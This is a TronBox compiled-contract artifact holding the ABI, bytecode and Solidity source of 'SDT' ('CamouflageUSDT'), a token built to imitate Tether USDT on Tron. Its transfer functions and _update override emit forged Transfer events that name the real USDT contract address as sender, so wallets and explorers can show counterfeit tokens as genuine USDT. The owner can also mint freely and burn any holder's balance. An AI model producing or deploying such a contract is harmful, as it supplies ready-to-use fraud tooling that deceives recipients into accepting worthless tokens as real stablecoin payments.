{
  "contractName": "SDT",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_usdtAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "allowance",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "needed",
          "type": "uint256"
        }
      ],
      "name": "ERC20InsufficientAllowance",
      "type": "error"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "sender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "balance",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "needed",
          "type": "uint256"
        }
      ],
      "name": "ERC20InsufficientBalance",
      "type": "error"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "approver",
          "type": "address"
        }
      ],
      "name": "ERC20InvalidApprover",
      "type": "error"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "receiver",
          "type": "address"
        }
      ],
      "name": "ERC20InvalidReceiver",
      "type": "error"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "sender",
          "type": "address"
        }
      ],
      "name": "ERC20InvalidSender",
      "type": "error"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        }
      ],
      "name": "ERC20InvalidSpender",
      "type": "error"
    },
    {
      "inputs": [],
      "name": "EnforcedPause",
      "type": "error"
    },
    {
      "inputs": [],
      "name": "ExpectedPause",
      "type": "error"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "owner",
          "type": "address"
        }
      ],
      "name": "OwnableInvalidOwner",
      "type": "error"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        }
      ],
      "name": "OwnableUnauthorizedAccount",
      "type": "error"
    },
    {
      "inputs": [],
      "name": "ReentrancyGuardReentrantCall",
      "type": "error"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Approval",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "bytes32",
          "name": "camouflageId",
          "type": "bytes32"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "actualSender",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "recipient",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "CamouflageRevealed",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "previousOwner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "OwnershipTransferred",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "address",
          "name": "account",
          "type": "address"
        }
      ],
      "name": "Paused",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Transfer",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        },
        {
          "indexed": false,
          "internalType": "bytes32",
          "name": "camouflageId",
          "type": "bytes32"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "timestamp",
          "type": "uint256"
        }
      ],
      "name": "TransferCamouflaged",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "address",
          "name": "account",
          "type": "address"
        }
      ],
      "name": "Unpaused",
      "type": "event"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        }
      ],
      "name": "allowance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "approve",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        }
      ],
      "name": "balanceOf",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "burn",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "bytes32",
          "name": "",
          "type": "bytes32"
        }
      ],
      "name": "camouflagedTransfers",
      "outputs": [
        {
          "internalType": "address",
          "name": "actualSender",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "recipient",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "timestamp",
          "type": "uint256"
        },
        {
          "internalType": "bool",
          "name": "revealed",
          "type": "bool"
        },
        {
          "internalType": "bool",
          "name": "exists",
          "type": "bool"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "decimals",
      "outputs": [
        {
          "internalType": "uint8",
          "name": "",
          "type": "uint8"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "tokenAddress",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "emergencyRecover",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "bytes32",
          "name": "camouflageId",
          "type": "bytes32"
        }
      ],
      "name": "getCamouflagedTransfer",
      "outputs": [
        {
          "components": [
            {
              "internalType": "address",
              "name": "actualSender",
              "type": "address"
            },
            {
              "internalType": "address",
              "name": "recipient",
              "type": "address"
            },
            {
              "internalType": "uint256",
              "name": "amount",
              "type": "uint256"
            },
            {
              "internalType": "uint256",
              "name": "timestamp",
              "type": "uint256"
            },
            {
              "internalType": "bool",
              "name": "revealed",
              "type": "bool"
            },
            {
              "internalType": "bool",
              "name": "exists",
              "type": "bool"
            }
          ],
          "internalType": "struct SDT.CamouflagedTransfer",
          "name": "",
          "type": "tuple"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "mint",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "name",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "pause",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "paused",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "renounceOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "bytes32",
          "name": "camouflageId",
          "type": "bytes32"
        }
      ],
      "name": "revealCamouflage",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "symbol",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "totalSupply",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "transfer",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "transferFrom",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "transferOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "unpause",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "usdtAddress",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801562000010575f80fd5b50d380156200001d575f80fd5b50d280156200002a575f80fd5b5060405162001b1938038062001b198339810160408190526200004d916200035d565b336040518060400160405280600b81526020016a029b23a102a32ba3432b9160ad1b8152506040518060400160405280600581526020016430ef14d11560da1b8152508160039081620000a1919062000435565b506004620000b0828262000435565b5050506001600160a01b038116620000e257604051631e4fbdf760e01b81525f60048201526024015b60405180910390fd5b620000ed816200017b565b5060016006556001600160a01b038116156200010a578062000120565b73a614f803b6fd780986a42c78ec9c7f77e6ded13c5b600780546001600160a01b0319166001600160a01b039290921691909117905562000174336200014e600690565b6200015b90600a6200060c565b6200016e90662386f26fc1000062000623565b620001cc565b5062000653565b600580546001600160a01b038381166001600160a01b0319831681179093556040519116919082907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0905f90a35050565b6001600160a01b038216620001f75760405163ec442f0560e01b81525f6004820152602401620000d9565b620002045f838362000208565b5050565b620002158383836200024d565b6007546040518281526001600160a01b038481169216905f8051602062001af9833981519152906020015b60405180910390a3505050565b6001600160a01b0383166200027b578060025f8282546200026f91906200063d565b90915550620002ed9050565b6001600160a01b0383165f9081526020819052604090205481811015620002cf5760405163391434e360e21b81526001600160a01b03851660048201526024810182905260448101839052606401620000d9565b6001600160a01b0384165f9081526020819052604090209082900390555b6001600160a01b0382166200030b5760028054829003905562000329565b6001600160a01b0382165f9081526020819052604090208054820190555b816001600160a01b0316836001600160a01b03165f8051602062001af9833981519152836040516200024091815260200190565b5f602082840312156200036e575f80fd5b81516001600160a81b038116811462000385575f80fd5b6001600160a01b03169392505050565b634e487b7160e01b5f52604160045260245ffd5b600181811c90821680620003be57607f821691505b602082108103620003dd57634e487b7160e01b5f52602260045260245ffd5b50919050565b601f82111562000430575f81815260208120601f850160051c810160208610156200040b5750805b601f850160051c820191505b818110156200042c5782815560010162000417565b5050505b505050565b81516001600160401b0381111562000451576200045162000395565b6200046981620004628454620003a9565b84620003e3565b602080601f8311600181146200049f575f8415620004875750858301515b5f19600386901b1c1916600185901b1785556200042c565b5f85815260208120601f198616915b82811015620004cf57888601518255948401946001909101908401620004ae565b5085821015620004ed57878501515f19600388901b60f8161c191681555b5050505050600190811b01905550565b634e487b7160e01b5f52601160045260245ffd5b600181815b808511156200055157815f1904821115620005355762000535620004fd565b808516156200054357918102915b93841c939080029062000516565b509250929050565b5f82620005695750600162000606565b816200057757505f62000606565b81600181146200059057600281146200059b57620005bb565b600191505062000606565b60ff841115620005af57620005af620004fd565b50506001821b62000606565b5060208310610133831016604e8410600b8410161715620005e0575081810a62000606565b620005ec838362000511565b805f1904821115620006025762000602620004fd565b0290505b92915050565b5f6200061c60ff84168362000559565b9392505050565b8082028115828204841417620006065762000606620004fd565b80820180821115620006065762000606620004fd565b61149880620006615f395ff3fe608060405234801561000f575f80fd5b50d3801561001b575f80fd5b50d28015610027575f80fd5b5060043610610155575f3560e01c8063715018a6116100cc5780639dc29fac116100915780639dc29fac1461038f578063a9059cbb146103a2578063ad1329d1146103b5578063dd62ed3e146103c8578063e97b628b146103db578063f2fde38b1461046b575f80fd5b8063715018a61461033f5780638456cb59146103475780638da5cb5b1461034f57806395d89b41146103745780639ab4a4451461037c575f80fd5b80633f4ba83a1161011d5780633f4ba83a146101ce57806340c10f19146101d857806350e5bc00146101eb5780635a6f2d36146102f25780635c975abb1461030557806370a0823114610317575f80fd5b806306fdde0314610159578063095ea7b31461017757806318160ddd1461019a57806323b872dd146101ac578063313ce567146101bf575b5f80fd5b61016161047e565b60405161016e9190611299565b60405180910390f35b61018a61018536600461130a565b61050e565b604051901515815260200161016e565b6002545b60405190815260200161016e565b61018a6101ba366004611332565b610527565b6040516006815260200161016e565b6101d66107af565b005b6101d66101e636600461130a565b6107c1565b6102996101f936600461136b565b6040805160c0810182525f80825260208201819052918101829052606081018290526080810182905260a0810191909152505f90815260086020908152604091829020825160c08101845281546001600160a01b039081168252600183015416928101929092526002810154928201929092526003820154606082015260049091015460ff8082161515608084015261010090910416151560a082015290565b60405161016e919081516001600160a01b03908116825260208084015190911690820152604080830151908201526060808301519082015260808083015115159082015260a09182015115159181019190915260c00190565b6101d661030036600461136b565b6107d7565b600554600160a01b900460ff1661018a565b61019e610325366004611382565b6001600160a01b03165f9081526020819052604090205490565b6101d6610965565b6101d6610976565b6005546001600160a01b03165b6040516001600160a01b03909116815260200161016e565b610161610986565b60075461035c906001600160a01b031681565b6101d661039d36600461130a565b610995565b61018a6103b036600461130a565b6109a7565b6101d66103c3366004611332565b610bbb565b61019e6103d636600461139b565b610ce7565b61042f6103e936600461136b565b60086020525f9081526040902080546001820154600283015460038401546004909401546001600160a01b03938416949390921692909160ff8082169161010090041686565b604080516001600160a01b03978816815296909516602087015293850192909252606084015215156080830152151560a082015260c00161016e565b6101d6610479366004611382565b610d11565b60606003805461048d906113cc565b80601f01602080910402602001604051908101604052809291908181526020018280546104b9906113cc565b80156105045780601f106104db57610100808354040283529160200191610504565b820191905f5260205f20905b8154815290600101906020018083116104e757829003601f168201915b5050505050905090565b5f3361051b818585610d4e565b60019150505b92915050565b5f610530610d60565b610538610d8b565b6001600160a01b03831661058e5760405162461bcd60e51b81526020600482015260186024820152775472616e7366657220746f207a65726f206164647265737360401b60448201526064015b60405180910390fd5b5f82116105dd5760405162461bcd60e51b815260206004820181905260248201527f5472616e7366657220616d6f756e74206d75737420626520706f7369746976656044820152606401610585565b816105fc856001600160a01b03165f9081526020819052604090205490565b10156106415760405162461bcd60e51b8152602060048201526014602482015273496e73756666696369656e742062616c616e636560601b6044820152606401610585565b8161064c8533610ce7565b10156106935760405162461bcd60e51b8152602060048201526016602482015275496e73756666696369656e7420616c6c6f77616e636560501b6044820152606401610585565b5f61069f858585610db5565b6040805160c0810182526001600160a01b038089168252878116602080840191825283850189815242606086019081525f60808701818152600160a089018181528b8452600890965298909120965187549087166001600160a01b0319918216178855945197870180549890961697909416969096179093559151600284015592516003830155915160049091018054925115156101000261ff00199215159290921661ffff1990931692909217179055905061075d853385610e1c565b610768858585610e7a565b6007546040518481526001600160a01b038681169216905f805160206114438339815191529060200160405180910390a360019150506107a86001600655565b9392505050565b6107b7610ed7565b6107bf610f04565b565b6107c9610ed7565b6107d38282610f59565b5050565b5f8181526008602052604090206004810154610100900460ff1661083d5760405162461bcd60e51b815260206004820152601760248201527f5472616e7366657220646f6573206e6f742065786973740000000000000000006044820152606401610585565b600481015460ff16156108925760405162461bcd60e51b815260206004820152601960248201527f5472616e7366657220616c72656164792072657665616c6564000000000000006044820152606401610585565b80546001600160a01b03163314806108b457506005546001600160a01b031633145b6109005760405162461bcd60e51b815260206004820152601f60248201527f4f6e6c792073656e646572206f72206f776e65722063616e2072657665616c006044820152606401610585565b60048101805460ff19166001908117909155810154815460028301546040519081526001600160a01b03928316929091169084907f6c106b34acd1a66ddb1ef75d48ede56b06f87a44239e027cc512257f32a0c68c9060200160405180910390a45050565b61096d610ed7565b6107bf5f610f8d565b61097e610ed7565b6107bf610fde565b60606004805461048d906113cc565b61099d610ed7565b6107d38282611021565b5f6109b0610d60565b6109b8610d8b565b6001600160a01b038316610a095760405162461bcd60e51b81526020600482015260186024820152775472616e7366657220746f207a65726f206164647265737360401b6044820152606401610585565b5f8211610a585760405162461bcd60e51b815260206004820181905260248201527f5472616e7366657220616d6f756e74206d75737420626520706f7369746976656044820152606401610585565b335f90815260208190526040902054821115610aad5760405162461bcd60e51b8152602060048201526014602482015273496e73756666696369656e742062616c616e636560601b6044820152606401610585565b5f610ab9338585610db5565b6040805160c081018252338082526001600160a01b0388811660208085019182528486018a815242606087019081525f60808801818152600160a08a018181528c8452600890965299909120975188549087166001600160a01b0319918216178955945198880180549990961698909416979097179093559151600285015593516003840155925160049092018054935115156101000261ff00199315159390931661ffff199094169390931791909117909155909150610b7b908585610e7a565b6007546040518481526001600160a01b038681169216905f805160206114438339815191529060200160405180910390a360019150506105216001600655565b610bc3610ed7565b306001600160a01b03841603610c1b5760405162461bcd60e51b815260206004820152601960248201527f43616e6e6f74207265636f766572206f776e20746f6b656e73000000000000006044820152606401610585565b6001600160a01b038216610c715760405162461bcd60e51b815260206004820152601e60248201527f43616e6e6f74207265636f76657220746f207a65726f206164647265737300006044820152606401610585565b60405163a9059cbb60e01b81526001600160a01b0383811660048301526024820183905284169063a9059cbb906044016020604051808303815f875af1158015610cbd573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610ce19190611404565b50505050565b6001600160a01b039182165f90815260016020908152604080832093909416825291909152205490565b610d19610ed7565b6001600160a01b038116610d4257604051631e4fbdf760e01b81525f6004820152602401610585565b610d4b81610f8d565b50565b610d5b8383836001611055565b505050565b600554600160a01b900460ff16156107bf5760405163d93c066560e01b815260040160405180910390fd5b600260065403610dae57604051633ee5aeb560e01b815260040160405180910390fd5b6002600655565b6040516bffffffffffffffffffffffff19606085811b8216602084015284811b821660348401526048830184905242606884015243608884015233901b1660a88201525f9060bc016040516020818303038152906040528051906020012090509392505050565b5f610e278484610ce7565b90505f19811015610ce15781811015610e6c57604051637dc7a0d960e11b81526001600160a01b03841660048201526024810182905260448101839052606401610585565b610ce184848484035f611055565b6001600160a01b038316610ea357604051634b637e8f60e11b81525f6004820152602401610585565b6001600160a01b038216610ecc5760405163ec442f0560e01b81525f6004820152602401610585565b610d5b838383611127565b6005546001600160a01b031633146107bf5760405163118cdaa760e01b8152336004820152602401610585565b610f0c611169565b6005805460ff60a01b191690557f5db9ee0a495bf2e6ff9c91a7834c1ba4fdd244a5e8aa4e537bd38aeae4b073aa335b6040516001600160a01b03909116815260200160405180910390a1565b6001600160a01b038216610f825760405163ec442f0560e01b81525f6004820152602401610585565b6107d35f8383611127565b600580546001600160a01b038381166001600160a01b0319831681179093556040519116919082907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0905f90a35050565b610fe6610d60565b6005805460ff60a01b1916600160a01b1790557f62e78cea01bee320cd4e420270b5ea74000d11b0c9f74754ebdbfc544b05a258610f3c3390565b6001600160a01b03821661104a57604051634b637e8f60e11b81525f6004820152602401610585565b6107d3825f83611127565b6001600160a01b03841661107e5760405163e602df0560e01b81525f6004820152602401610585565b6001600160a01b0383166110a757604051634a1406b160e11b81525f6004820152602401610585565b6001600160a01b038085165f9081526001602090815260408083209387168352929052208290558015610ce157826001600160a01b0316846001600160a01b03167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9258460405161111991815260200190565b60405180910390a350505050565b611132838383611193565b6007546040518281526001600160a01b038481169216905f80516020611443833981519152906020015b60405180910390a3505050565b600554600160a01b900460ff166107bf57604051638dfc202b60e01b815260040160405180910390fd5b6001600160a01b0383166111bd578060025f8282546111b29190611423565b9091555061122d9050565b6001600160a01b0383165f908152602081905260409020548181101561120f5760405163391434e360e21b81526001600160a01b03851660048201526024810182905260448101839052606401610585565b6001600160a01b0384165f9081526020819052604090209082900390555b6001600160a01b03821661124957600280548290039055611267565b6001600160a01b0382165f9081526020819052604090208054820190555b816001600160a01b0316836001600160a01b03165f805160206114438339815191528360405161115c91815260200190565b5f6020808352835180828501525f5b818110156112c4578581018301518582016040015282016112a8565b505f604082860101526040601f19601f8301168501019250505092915050565b5f81356001600160a81b03811681146112fb575f80fd5b6001600160a01b031692915050565b5f806040838503121561131b575f80fd5b611324836112e4565b946020939093013593505050565b5f805f60608486031215611344575f80fd5b61134d846112e4565b925061135b602085016112e4565b9150604084013590509250925092565b5f6020828403121561137b575f80fd5b5035919050565b5f60208284031215611392575f80fd5b6107a8826112e4565b5f80604083850312156113ac575f80fd5b6113b5836112e4565b91506113c3602084016112e4565b90509250929050565b600181811c908216806113e057607f821691505b6020821081036113fe57634e487b7160e01b5f52602260045260245ffd5b50919050565b5f60208284031215611414575f80fd5b815180151581146107a8575f80fd5b8082018082111561052157634e487b7160e01b5f52601160045260245ffdfeddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3efa26474726f6e582212201d19d20965c65ae064e9e64eacfb1dabb46eef5ead4b1e4ea6c70780ebf18c4664736f6c63430008140033ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/utils/Pausable.sol\";\nimport \"@openzeppelin/contracts/utils/ReentrancyGuard.sol\";\n\n/**\n * @title CamouflageUSDT\n * @dev A USDT-like token with address camouflage functionality\n * This contract mimics USDT's behavior while hiding the actual sender's address\n */\ncontract SDT is ERC20, Ownable, Pausable, ReentrancyGuard {\n    // Chain-configurable address used when emitting camouflaged events\n    address public usdtAddress;\n    \n    // Mapping to store camouflaged transfers\n    mapping(bytes32 => CamouflagedTransfer) public camouflagedTransfers;\n    \n    // Events\n    event TransferCamouflaged(\n        address indexed from,\n        address indexed to,\n        uint256 amount,\n        bytes32 camouflageId,\n        uint256 timestamp\n    );\n    \n    event CamouflageRevealed(\n        bytes32 indexed camouflageId,\n        address indexed actualSender,\n        address indexed recipient,\n        uint256 amount\n    );\n    \n    // Struct to store camouflaged transfer details\n    struct CamouflagedTransfer {\n        address actualSender;\n        address recipient;\n        uint256 amount;\n        uint256 timestamp;\n        bool revealed;\n        bool exists;\n    }\n    \n    // Constructor\n    constructor(address _usdtAddress) ERC20(\"Sdt Tether \",unicode\"SDT\") Ownable(msg.sender) {\n        // Default to Tron USDT (TRC20) if not provided\n        // Tron USDT (TRC20) address (hex form without 0x41 prefix): 0xa614f803b6fd780986a42c78ec9c7f77e6ded13c\n        usdtAddress = _usdtAddress == address(0)\n            ? 0xa614f803B6FD780986A42c78Ec9c7f77e6DeD13C\n            : _usdtAddress;\n        _mint(msg.sender, 10000000000000000 * 10**decimals()); // Initial supply\n    }\n    \n    /**\n     * @dev Standard transfer function with camouflage\n     * @param to Recipient address\n     * @param amount Amount to transfer\n     * @return bool Success status\n     */\n    function transfer(address to, uint256 amount) \n        public \n        virtual \n        override \n        whenNotPaused \n        nonReentrant \n        returns (bool) \n    {\n        require(to != address(0), \"Transfer to zero address\");\n        require(amount > 0, \"Transfer amount must be positive\");\n        require(balanceOf(msg.sender) >= amount, \"Insufficient balance\");\n        \n        // Generate camouflage ID\n        bytes32 camouflageId = _generateCamouflageId(msg.sender, to, amount);\n        \n        // Store camouflaged transfer\n        camouflagedTransfers[camouflageId] = CamouflagedTransfer({\n            actualSender: msg.sender,\n            recipient: to,\n            amount: amount,\n            timestamp: block.timestamp,\n            revealed: false,\n            exists: true\n        });\n        \n        // Perform actual transfer (will emit standard Transfer event)\n        _transfer(msg.sender, to, amount);\n        \n        // Emit camouflaged Transfer event (shows USDT address as sender)\n        emit Transfer(usdtAddress, to, amount);\n        \n        return true;\n    }\n    \n    /**\n     * @dev Transfer from function with camouflage\n     * @param from Sender address\n     * @param to Recipient address\n     * @param amount Amount to transfer\n     * @return bool Success status\n     */\n    function transferFrom(address from, address to, uint256 amount) \n        public \n        virtual \n        override \n        whenNotPaused \n        nonReentrant \n        returns (bool) \n    {\n        require(to != address(0), \"Transfer to zero address\");\n        require(amount > 0, \"Transfer amount must be positive\");\n        require(balanceOf(from) >= amount, \"Insufficient balance\");\n        require(allowance(from, msg.sender) >= amount, \"Insufficient allowance\");\n        \n        // Generate camouflage ID\n        bytes32 camouflageId = _generateCamouflageId(from, to, amount);\n        \n        // Store camouflaged transfer\n        camouflagedTransfers[camouflageId] = CamouflagedTransfer({\n            actualSender: from,\n            recipient: to,\n            amount: amount,\n            timestamp: block.timestamp,\n            revealed: false,\n            exists: true\n        });\n        \n        // Perform actual transfer (will emit standard Transfer event)\n        _spendAllowance(from, msg.sender, amount);\n        _transfer(from, to, amount);\n        \n        // Emit camouflaged Transfer event (shows USDT address as sender)\n        emit Transfer(usdtAddress, to, amount);\n        \n        return true;\n    }\n    \n    /**\n     * @dev Reveal the actual sender of a camouflaged transfer\n     * @param camouflageId The camouflage ID to reveal\n     */\n    function revealCamouflage(bytes32 camouflageId) external {\n        CamouflagedTransfer storage camouflagedTransfer = camouflagedTransfers[camouflageId];\n        require(camouflagedTransfer.exists, \"Transfer does not exist\");\n        require(!camouflagedTransfer.revealed, \"Transfer already revealed\");\n        \n        // Only the actual sender or owner can reveal\n        require(\n            msg.sender == camouflagedTransfer.actualSender || msg.sender == owner(),\n            \"Only sender or owner can reveal\"\n        );\n        \n        camouflagedTransfer.revealed = true;\n        \n        emit CamouflageRevealed(\n            camouflageId,\n            camouflagedTransfer.actualSender,\n            camouflagedTransfer.recipient,\n            camouflagedTransfer.amount\n        );\n    }\n    \n    /**\n     * @dev Get camouflaged transfer details\n     * @param camouflageId The camouflage ID\n     * @return CamouflagedTransfer struct\n     */\n    function getCamouflagedTransfer(bytes32 camouflageId) \n        external \n        view \n        returns (CamouflagedTransfer memory) \n    {\n        return camouflagedTransfers[camouflageId];\n    }\n    \n    \n    /**\n     * @dev Generate a unique camouflage ID\n     * @param from Sender address\n     * @param to Recipient address\n     * @param amount Transfer amount\n     * @return bytes32 Unique camouflage ID\n     */\n    function _generateCamouflageId(address from, address to, uint256 amount) \n        internal \n        view \n        returns (bytes32) \n    {\n        return keccak256(\n            abi.encodePacked(\n                from,\n                to,\n                amount,\n                block.timestamp,\n                block.number,\n                msg.sender\n            )\n        );\n    }\n    \n    /**\n     * @dev Pause all transfers\n     */\n    function pause() external onlyOwner {\n        _pause();\n    }\n    \n    /**\n     * @dev Unpause all transfers\n     */\n    function unpause() external onlyOwner {\n        _unpause();\n    }\n    \n    /**\n     * @dev Mint new tokens (owner only)\n     * @param to Recipient address\n     * @param amount Amount to mint\n     */\n    function mint(address to, uint256 amount) external onlyOwner {\n        _mint(to, amount);\n    }\n    \n    /**\n     * @dev Burn tokens from an address\n     * @param from Address to burn from\n     * @param amount Amount to burn\n     */\n    function burn(address from, uint256 amount) external onlyOwner {\n        _burn(from, amount);\n    }\n    \n    /**\n     * @dev Override _update to emit camouflaged Transfer events\n     */\n    function _update(address from, address to, uint256 value) internal virtual override {\n        // Call parent _update to handle balance changes\n        super._update(from, to, value);\n        \n        // Emit camouflaged Transfer event (shows configured usdtAddress as sender)\n        emit Transfer(usdtAddress, to, value);\n    }\n\n    /**\n     * @dev Override decimals to match USDT (6 decimals)\n     */\n    function decimals() public view virtual override returns (uint8) {\n        return 6;\n    }\n    \n    /**\n     * @dev Emergency function to recover stuck tokens\n     * @param tokenAddress Address of the token to recover\n     * @param to Recipient address\n     * @param amount Amount to recover\n     */\n    function emergencyRecover(address tokenAddress, address to, uint256 amount) \n        external \n        onlyOwner \n    {\n        require(tokenAddress != address(this), \"Cannot recover own tokens\");\n        require(to != address(0), \"Cannot recover to zero address\");\n        \n        IERC20(tokenAddress).transfer(to, amount);\n    }\n}\n",
  "sourcePath": "/Users/user/nft/TronBoxProject/contracts/SDT.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.20+commit.5f1834bc.Emscripten.clang"
  },
  "schemaVersion": "2.0.1",
  "updatedAt": "2025-09-10T19:33:56.409Z"
}